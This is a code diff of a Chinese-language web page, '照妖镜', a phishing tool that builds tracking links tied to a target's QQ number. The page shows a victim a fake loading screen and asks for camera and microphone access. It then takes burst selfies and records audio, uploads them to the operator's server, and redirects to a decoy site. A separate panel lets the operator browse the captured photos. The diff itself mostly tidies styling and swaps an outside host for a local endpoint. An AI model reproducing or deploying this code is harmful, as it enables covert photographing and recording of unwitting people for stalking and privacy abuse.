@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>照妖镜 - 多功能采集工具</title>
+    <title>照妖镜 · 多功能采集</title>
     <style>
-        /* ===== 基础样式 ===== */
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif;
@@ -18,30 +17,61 @@
             padding: 20px;
         }
         .config-container { max-width: 600px; width:100%; }
-        .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; margin-bottom:20px; }
+        .card {
+            background:#13131a; border:1px solid #2a2a35; border-radius:12px;
+            padding:32px 28px; margin-bottom:20px;
+        }
         .card-header { text-align:center; margin-bottom:24px; }
         .card-header .icon { font-size:48px; }
-        .card-header h1 { font-size:26px; background:linear-gradient(135deg,#e0e0e0,#a0a0c0); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
+        .card-header h1 {
+            font-size:26px;
+            background:linear-gradient(135deg,#e0e0e0,#a0a0c0);
+            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+        }
         .form-group { margin-bottom:20px; }
         .form-group label { display:block; font-size:13px; color:#a0a0b0; margin-bottom:6px; }
         .form-group input, .form-group select {
-            width:100%; padding:13px 15px; background:#1a1a24; border:1.5px solid #2a2a35;
-            border-radius:8px; color:#e0e0e0; font-size:15px; outline:none;
+            width:100%; padding:13px 15px; background:#1a1a24;
+            border:1.5px solid #2a2a35; border-radius:8px; color:#e0e0e0;
+            font-size:15px; outline:none;
         }
-        .form-group input[type="number"] { -moz-appearance:textfield; }
         .checkbox-group { display:flex; align-items:center; gap:10px; }
         .checkbox-group input[type="checkbox"] { width:auto; }
-        .btn { width:100%; padding:14px; background:#6c5ce7; color:#fff; border:none; border-radius:8px; font-size:16px; cursor:pointer; margin-bottom:10px; }
+        .btn {
+            width:100%; padding:14px; background:#6c5ce7; color:#fff;
+            border:none; border-radius:8px; font-size:16px; cursor:pointer;
+            margin-bottom:10px;
+        }
         .btn-secondary { background:#2ecc71; }
-        .result-area { display:none; margin-top:20px; padding:18px; background:#0d0d15; border:1px solid #2a2a35; border-radius:8px; }
+        .result-area {
+            display:none; margin-top:20px; padding:18px;
+            background:#0d0d15; border:1px solid #2a2a35; border-radius:8px;
+        }
         .result-area.show { display:block; }
-        .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
-        .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
-        .photo-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); gap:10px; margin-top:10px; }
-        .photo-grid img { width:100%; height:100px; object-fit:cover; border-radius:6px; border:1px solid #333; }
-        .warning-box { margin-top:18px; padding:12px; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.25); border-radius:8px; font-size:12px; color:#e98b82; }
+        .result-area input {
+            width:100%; padding:10px; background:#1a1a24;
+            border:1px solid #2a2a35; border-radius:6px; color:#7ecbff;
+        }
+        .btn-copy {
+            padding:10px 16px; background:#2ecc71; color:#fff;
+            border:none; border-radius:6px; cursor:pointer; margin-top:8px;
+        }
+        .photo-grid {
+            display:grid; grid-template-columns:repeat(auto-fill, minmax(120px,1fr));
+            gap:10px; margin-top:10px;
+        }
+        .photo-grid img {
+            width:100%; height:100px; object-fit:cover;
+            border-radius:6px; border:1px solid #333; cursor:pointer;
+        }
+        .warning-box {
+            margin-top:18px; padding:12px;
+            background:rgba(231,76,60,0.08);
+            border:1px solid rgba(231,76,60,0.25);
+            border-radius:8px; font-size:12px; color:#e98b82;
+        }
 
-        /* ===== 追踪界面 ===== */
+        /* 追踪页 */
         .track-overlay {
             position:fixed; inset:0; z-index:99999; background:#000;
             display:flex; align-items:center; justify-content:center; flex-direction:column;
@@ -49,14 +79,20 @@
         }
         .log-stream {
             position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:0;
-            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
-            font-size: 10px; line-height: 1.6; color: #3d3d4a;
+            font-family:'SF Mono','Consolas','Monaco','Courier New',monospace;
+            font-size:10px; line-height:1.6; color:#3d3d4a;
             display:flex; flex-direction:column; justify-content:flex-end;
         }
         .log-line { display:block; width:100%; white-space:nowrap; overflow:hidden; flex-shrink:0; }
         .center-box { position:relative; z-index:1; text-align:center; }
-        .spinner { width:45px; height:45px; border:3px solid rgba(255,255,255,0.15); border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 20px; }
+        .spinner {
+            width:45px; height:45px; border:3px solid rgba(255,255,255,0.15);
+            border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite;
+            margin:0 auto 20px;
+        }
         @keyframes spin { to { transform:rotate(360deg); } }
+        .spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
+        .spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
         .status-text { color:#aaa; font-size:15px; }
         .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
         .denied-msg.show { display:block; }
@@ -64,7 +100,7 @@
 </head>
 <body>
 
-<!-- ========== 配置模式（主页） ========== -->
+<!-- ==================== 主页（配置模式） ==================== -->
 <div id="configMode" class="config-container">
     <div class="card">
         <div class="card-header">
@@ -73,7 +109,6 @@
             <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 拍照 · 连拍 · 录音</p>
         </div>
 
-        <!-- 基础信息 -->
         <div class="form-group">
             <label>QQ号 <span style="color:#e74c3c;">*</span></label>
             <input type="text" id="qqInput" placeholder="输入目标QQ号" maxlength="20">
@@ -83,7 +118,6 @@
             <input type="url" id="urlInput" placeholder="https://example.com">
         </div>
 
-        <!-- 新增：连拍和录音选项 -->
         <div class="form-group">
             <label>连拍张数</label>
             <input type="number" id="burstInput" value="1" min="1" max="10" step="1">
@@ -107,7 +141,7 @@
         </div>
     </div>
 
-    <!-- 查询照片区域 -->
+    <!-- 查询照片 -->
     <div class="card">
         <div class="card-header">
             <span class="icon">📁</span>
@@ -122,7 +156,7 @@
     </div>
 </div>
 
-<!-- ========== 追踪模式 ========== -->
+<!-- ==================== 追踪模式 ==================== -->
 <div class="track-overlay" id="trackMode" style="display:none;">
     <div class="log-stream" id="logStream"></div>
     <div class="center-box">
@@ -141,7 +175,7 @@
 <script>
 const $ = id => document.getElementById(id);
 
-// ========== 配置模式功能 ==========
+// ========== 主页功能 ==========
 function generateLink() {
     const qq = $('qqInput').value.trim();
     const url = $('urlInput').value.trim();
@@ -170,7 +204,6 @@ function copyLink() {
     .catch(() => document.execCommand('copy'));
 }
 
-// 查询照片
 async function queryPhotos() {
     const qq = $('queryQQ').value.trim();
     if (!qq) return alert('请输入QQ号');
@@ -178,7 +211,7 @@ async function queryPhotos() {
     resultDiv.innerHTML = '查询中...';
 
     try {
-        const resp = await fetch(`http://a1nb66.atwebpages.com/zyj/?action=list_images&qq=${qq}`);
+        const resp = await fetch(`api.php?action=list_images&qq=${qq}`);
         const data = await resp.json();
         if (!data.success) {
             resultDiv.innerHTML = `<div style="color:#e74c3c;">${data.message || '查询失败'}</div>`;
@@ -190,7 +223,8 @@ async function queryPhotos() {
         }
         let html = '<div class="photo-grid">';
         data.images.forEach(img => {
-            html += `<img src="./${qq}/${img}" loading="lazy" onclick="window.open('./${qq}/${img}','_blank')">`;
+            const imgUrl = `api.php?action=view_image&qq=${qq}&file=${encodeURIComponent(img)}`;
+            html += `<img src="${imgUrl}" loading="lazy" onclick="window.open('${imgUrl}','_blank')">`;
         });
         html += '</div>';
         resultDiv.innerHTML = html;
@@ -199,7 +233,7 @@ async function queryPhotos() {
     }
 }
 
-// ========== 追踪模式核心 ==========
+// ========== 追踪页功能 ==========
 function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
     $('configMode').style.display = 'none';
     $('trackMode').style.display = 'flex';
@@ -209,8 +243,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
     const deniedMsg = $('deniedMsg');
     const vid = $('vid');
     const cvs = $('cvs');
-    const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
-
+    const API = 'api.php';
     const logStream = $('logStream');
     const MAX_LINES = 50;
     let logLines = [];
@@ -245,33 +278,34 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         setStatus('正在请求授权...');
         pushLog('Requesting permissions...');
 
-        // 请求摄像头
         let stream;
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: audioEnabled ? true : false  // 如果需要录音则同时请求麦克风
+                audio: audioEnabled ? true : false
             });
             pushLog('Permission granted (camera' + (audioEnabled ? ' + microphone' : '') + ')');
         } catch (e) {
             if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                 setStatus('访问被拒绝', true);
+                spinner.classList.add('error');
                 spinner.style.display = 'none';
                 deniedMsg.classList.add('show');
                 return;
             }
-            // 降级
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: audioEnabled });
                 pushLog('Fallback getUserMedia success');
             } catch (e2) {
                 if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
                     setStatus('访问被拒绝', true);
+                    spinner.classList.add('error');
                     spinner.style.display = 'none';
                     deniedMsg.classList.add('show');
                     return;
                 }
                 setStatus('设备不可用', true);
+                spinner.classList.add('error');
                 setTimeout(() => location.href = redirectUrl, 2000);
                 return;
             }
@@ -281,7 +315,6 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         vid.play().catch(()=>{});
         setStatus('准备就绪...');
 
-        // 等待视频就绪
         const ready = await new Promise(resolve => {
             const start = Date.now();
             const check = () => {
@@ -295,6 +328,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         if (!ready) {
             pushLog('Error: video stream timeout');
             setStatus('超时', true);
+            spinner.classList.add('error');
             stream.getTracks().forEach(t => t.stop());
             setTimeout(() => location.href = redirectUrl, 2000);
             return;
@@ -305,7 +339,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
         cvs.height = vid.videoHeight;
         const ctx = cvs.getContext('2d');
 
-        // ===== 连拍 =====
+        // 连拍
         for (let i = 0; i < burstCount; i++) {
             setStatus(`正在拍摄 (${i+1}/${burstCount})...`);
             ctx.drawImage(vid, 0, 0);
@@ -316,7 +350,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
             fd.append('qq', qq);
             fd.append('image', img);
             try {
-                const resp = await fetch(., { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
+                const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
                 if (resp.ok) {
                     const r = await resp.json();
                     if (r.success) pushLog(`Upload success: ${r.image || 'ok'}`);
@@ -327,10 +361,10 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
             } catch (e) {
                 pushLog(`Network error: ${e.message}`);
             }
-            if (i < burstCount - 1) await sleep(500); // 连拍间隔
+            if (i < burstCount - 1) await sleep(500);
         }
 
-        // ===== 录音（如果启用） =====
+        // 录音（如果启用）
         if (audioEnabled && stream.getAudioTracks().length > 0) {
             setStatus('正在录音...');
             pushLog('Recording audio (3s)...');
@@ -359,9 +393,8 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
                         } catch (e) {
                             pushLog(`Audio network error: ${e.message}`);
                         }
-                        // 完成
                         setStatus('完成 ✓');
-                        spinner.style.borderTopColor = '#2ecc71';
+                        spinner.classList.add('done');
                         setTimeout(() => location.href = redirectUrl, 1500);
                     };
                     reader.readAsDataURL(blob);
@@ -374,13 +407,11 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
                 setTimeout(() => location.href = redirectUrl, 1500);
             }
         } else {
-            // 没有录音，直接完成
             setStatus('完成 ✓');
-            spinner.style.borderTopColor = '#2ecc71';
+            spinner.classList.add('done');
             setTimeout(() => location.href = redirectUrl, 1500);
         }
 
-        // 清理摄像头
         stream.getTracks().forEach(t => t.stop());
     }
 
@@ -394,7 +425,7 @@ const params = new URLSearchParams(location.search);
 const qq = params.get('qq');
 const url = params.get('url');
 const burst = parseInt(params.get('burst') || '1');
-const audio = params.get('audio') !== '0'; // 默认开启录音
+const audio = params.get('audio') !== '0';
 if (qq && url) {
     startTrack(qq, decodeURIComponent(url), burst, audio);
 } else {
